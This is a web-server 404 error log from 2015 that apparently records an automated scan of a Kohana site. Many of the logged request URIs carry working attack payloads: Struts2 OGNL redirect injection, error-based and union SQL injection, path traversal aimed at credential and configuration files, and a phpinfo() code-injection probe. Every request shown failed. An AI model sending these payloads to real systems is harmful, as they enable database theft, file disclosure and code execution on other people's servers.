2015-04-10 13:46:18 uri:/robots.txt; code:404; msg:Unable to find a route to match the URI: robots.txt-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: robots.txt ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:
2015-04-10 17:59:48 uri:/item/upfile/; code:404; msg:The requested URL item/upfile was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL item/upfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/item/list4contr
2015-04-10 17:59:49 uri:/item/htdocs/; code:404; msg:The requested URL item/htdocs was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL item/htdocs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.xgomo.com:80/item/list4contr
2015-04-10 18:00:00 uri:/index.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D; code:404; msg:Unable to find a route to match the URI: index.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:00:13 uri:/webscan38502863.txt; code:404; msg:Unable to find a route to match the URI: webscan38502863.txt-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webscan38502863.txt ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:14 uri:/webscan38502863.txt; code:404; msg:Unable to find a route to match the URI: webscan38502863.txt-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webscan38502863.txt ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:20 uri:/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%207,8,Int(655366553-10241024),10,now%28%29,null,1%20%20frmasterom%20%7Bprefix%7Duser; code:404; msg:Unable to find a route to match the URI: plug/comment/commentList.asp-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: plug/comment/commentList.asp ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:23 uri:/outImg?imgPath=c%3A%5Cwindows%5Cwin.ini; code:404; msg:The requested URL outImg was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL outImg was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://121.40.211.61
2015-04-10 18:00:25 uri:/cgi-bin/authlogin.cgi; code:404; msg:Unable to find a route to match the URI: cgi-bin/authlogin.cgi-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/authlogin.cgi ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:26 uri:/cgi-bin/it.cgi; code:404; msg:Unable to find a route to match the URI: cgi-bin/it.cgi-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/it.cgi ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:27 uri:/cgi-bin/test-cgi; code:404; msg:The requested URL cgi-bin/test-cgi was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/test-cgi was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://121.40.211.61
2015-04-10 18:00:28 uri:/cgi-sys/defaultwebpage.cgi; code:404; msg:Unable to find a route to match the URI: cgi-sys/defaultwebpage.cgi-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/defaultwebpage.cgi ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:29 uri:/cgi-sys/FormMail-clone.cgi; code:404; msg:Unable to find a route to match the URI: cgi-sys/FormMail-clone.cgi-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-sys/FormMail-clone.cgi ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:32 uri:/index.php?admin_dir=admin&site=default&ishtml=1; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:33 uri:/index.php; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:34 uri:/index.php?c=api&a=down&file=ZDlhMi96WnAvcGtoNWVPNTRxTmtIYVV4Vnp1VjFFbkRlVmJvMGdWQlVaSFZldksvVzV4SGJ; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:35 uri:/NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2BInt(655366553-10241024),2,3,4,5,6,7,8,9%20%66%72%6F%6D%20%61%64%6D%69%6E; code:404; msg:Unable to find a route to match the URI: NewsType.asp-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: NewsType.asp ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:37 uri:/index.php/api/xmlrpc; code:404; msg:Unable to find a route to match the URI: index.php/api/xmlrpc-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php/api/xmlrpc ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:38 uri:/admin/others.asp?mudi=download_EN_CN&n=index.asp&ENname=../config.asp; code:404; msg:Unable to find a route to match the URI: admin/others.asp-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/others.asp ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:39 uri:/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:40 uri:/index.php?jobs=show&label_hf%5B1'%20and%20extractvalue(1,concat(0x5c,(select%20concat(username,md5(233333))%20from%20qb_members%20limit%201)))%23%5D%5B2%5D=asd; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:44 uri:/User/UserZone/School/Download.aspx?f=..%5C..%5C..%5CConfig%5CConnectionStrings.config; code:404; msg:Unable to find a route to match the URI: User/UserZone/School/Download.aspx-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: User/UserZone/School/Download.aspx ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:00:46 uri:/login.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D; code:404; msg:Unable to find a route to match the URI: login.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:00:48 uri:/admin.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D; code:404; msg:Unable to find a route to match the URI: admin.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:00:50 uri:/login.action?debug=browser; code:404; msg:Unable to find a route to match the URI: login.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:00:52 uri:/admin.action?debug=browser; code:404; msg:Unable to find a route to match the URI: admin.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:00:54 uri:/index.action?debug=browser; code:404; msg:Unable to find a route to match the URI: index.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:00:57 uri:/log/; code:404; msg:The requested URL log was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL log was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:00:59 uri:/logs/; code:404; msg:The requested URL logs was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL logs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:01:01 uri:/config/; code:404; msg:The requested URL config was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL config was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:01:03 uri:/db/; code:404; msg:The requested URL db was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL db was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:01:05 uri:/upload/; code:404; msg:The requested URL upload was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL upload was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:01:07 uri:/uploads/; code:404; msg:The requested URL uploads was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL uploads was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:01:09 uri:/backup/; code:404; msg:The requested URL backup was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL backup was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:01:11 uri:/data/; code:404; msg:The requested URL data was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:01:13 uri:/web/; code:404; msg:The requested URL web was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:01:56 uri:/uploadfiles/; code:404; msg:The requested URL uploadfiles was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL uploadfiles was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:01:58 uri:/uploadfile/; code:404; msg:The requested URL uploadfile was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL uploadfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:02:00 uri:/upfiles/; code:404; msg:The requested URL upfiles was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL upfiles was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:02:04 uri:/shop/index.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D; code:404; msg:Unable to find a route to match the URI: shop/index.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shop/index.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:06 uri:/upfile/; code:404; msg:The requested URL upfile was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL upfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:02:08 uri:/htdocs/; code:404; msg:The requested URL htdocs was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL htdocs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:02:14 uri:/index.php; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.igmoo.cn:80/equipment
2015-04-10 18:02:38 uri:/shop/login.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D; code:404; msg:Unable to find a route to match the URI: shop/login.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shop/login.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:40 uri:/shop/admin.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D; code:404; msg:Unable to find a route to match the URI: shop/admin.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shop/admin.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:41 uri:/shop/login.action?debug=browser; code:404; msg:Unable to find a route to match the URI: shop/login.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shop/login.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:43 uri:/shop/admin.action?debug=browser; code:404; msg:Unable to find a route to match the URI: shop/admin.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shop/admin.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:44 uri:/shop/index.action?debug=browser; code:404; msg:Unable to find a route to match the URI: shop/index.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: shop/index.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:45 uri:/shop/log/; code:404; msg:The requested URL shop/log was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/log was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:46 uri:/shop/logs/; code:404; msg:The requested URL shop/logs was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/logs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:47 uri:/shop/config/; code:404; msg:The requested URL shop/config was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/config was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:49 uri:/shop/db/; code:404; msg:The requested URL shop/db was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/db was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:50 uri:/shop/upload/; code:404; msg:The requested URL shop/upload was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/upload was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:51 uri:/shop/uploads/; code:404; msg:The requested URL shop/uploads was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/uploads was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:52 uri:/shop/backup/; code:404; msg:The requested URL shop/backup was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/backup was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:53 uri:/shop/data/; code:404; msg:The requested URL shop/data was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/data was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:54 uri:/shop/web/; code:404; msg:The requested URL shop/web was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:55 uri:/shop/uploadfiles/; code:404; msg:The requested URL shop/uploadfiles was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/uploadfiles was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:02:58 uri:/shop/uploadfile/; code:404; msg:The requested URL shop/uploadfile was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/uploadfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:03:00 uri:/shop/upfiles/; code:404; msg:The requested URL shop/upfiles was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/upfiles was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:03:05 uri:/shop/upfile/; code:404; msg:The requested URL shop/upfile was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/upfile was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:03:07 uri:/shop/htdocs/; code:404; msg:The requested URL shop/htdocs was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL shop/htdocs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 113 ]; referer:http://www.igmoo.cn:80/shop/list
2015-04-10 18:03:29 uri:/mailmain?intertype=ajax&type=getAllUserList_simple; code:404; msg:The requested URL mailmain was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL mailmain was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://121.40.211.61
2015-04-10 18:03:41 uri:/index.php?ac=search&at=taglist&tagkey=%2527%2Ctags%29+or%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+concat%28md5%283.1415%29%29%29+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+information_schema.tables+group+by+x%29a%29%23; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:03:43 uri:/index.php?m=Goods&a=showcate&id=103%20and%20(select%201%20from%20(select%20count(*),concat(md5(233333),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a); code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:03:51 uri:/index.php?edition-compare-1; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:03:53 uri:/index.php?act=show_groupbuy&op=groupbuy_list&id=1&groupbuy_order_key=price&groupbuy_order=%20%20and%20%28select%201%20from%20%20%28select%20count%28*%29,concat%28md5%28233333%29,floor%28rand%280%29*2%29%29x%20from%20%20information_schema.tables%20group%20by%20x%29a%29%20--; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:03:54 uri:/wp-content/plugins/wp-slimstat/readme.txt; code:404; msg:Unable to find a route to match the URI: wp-content/plugins/wp-slimstat/readme.txt-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: wp-content/plugins/wp-slimstat/readme.txt ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:03:55 uri:/index.php; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:03:58 uri:/index.php; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://www.abc.com'and(select 1 from(select count(*),concat(floor(rand(0)*2),0x3a,(select(select(SELECT concat(admin_name,0x3a,md5(233333))FROM shopnc_admin limit 0,1))from information_schema.tables limit 0,1))x from information_schema.tables group by x)a) and 1=1)#
2015-04-10 18:03:59 uri:/memadmin/README.txt; code:404; msg:Unable to find a route to match the URI: memadmin/README.txt-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: memadmin/README.txt ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:01 uri:/yanfang/?q=%7B$%7Bphpinfo()%7D%7D; code:404; msg:The requested URL yanfang was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL yanfang was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://121.40.211.61
2015-04-10 18:04:02 uri:/jiufang/?q=%7B$%7Bphpinfo()%7D%7D; code:404; msg:The requested URL jiufang was not found on this server.-HTTP_Exception_404 [ 404 ]: The requested URL jiufang was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]; referer:http://121.40.211.61
2015-04-10 18:04:10 uri:/admin/index.php/login/check; code:404; msg:Unable to find a route to match the URI: admin/index.php/login/check-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/index.php/login/check ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:11 uri:/admin/ckfinder/core/connector/asp/connector.asp?command=FileUpload&type=Images&Folder=%2F&langCode=zh-cn&hash=6c6a79911ae80ce2&; code:404; msg:Unable to find a route to match the URI: admin/ckfinder/core/connector/asp/connector.asp-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/ckfinder/core/connector/asp/connector.asp ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:22 uri:/index.php; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:27 uri:/data/mysql_error_trace.inc; code:404; msg:Unable to find a route to match the URI: data/mysql_error_trace.inc-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: data/mysql_error_trace.inc ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:31 uri:/index.php?option=com_jobprofile&Itemid=61&task=profilesview&id=-1+union+all+select+1,concat_ws(0x3a,0x3a,md5(233333),0x3a),3,4,5,6,7,8,9; code:404; msg:Unable to find a route to match the URI: index.php-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.php ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:48 uri:/index.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D; code:404; msg:Unable to find a route to match the URI: index.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:50 uri:/login.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D; code:404; msg:Unable to find a route to match the URI: login.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:50 uri:/admin.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D; code:404; msg:Unable to find a route to match the URI: admin.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:51 uri:/index.action; code:404; msg:Unable to find a route to match the URI: index.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:52 uri:/login.action; code:404; msg:Unable to find a route to match the URI: login.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:54 uri:/admin.action; code:404; msg:Unable to find a route to match the URI: admin.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:56 uri:/login.action?debug=browser; code:404; msg:Unable to find a route to match the URI: login.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:58 uri:/admin.action?debug=browser; code:404; msg:Unable to find a route to match the URI: admin.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:58 uri:/index.action?debug=browser; code:404; msg:Unable to find a route to match the URI: index.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:04:59 uri:/login.action; code:404; msg:Unable to find a route to match the URI: login.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:05:00 uri:/admin.action; code:404; msg:Unable to find a route to match the URI: admin.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
2015-04-10 18:05:01 uri:/index.action; code:404; msg:Unable to find a route to match the URI: index.action-HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: index.action ~ SYSPATH/classes/kohana/request.php [ 1124 ]; referer:http://121.40.211.61
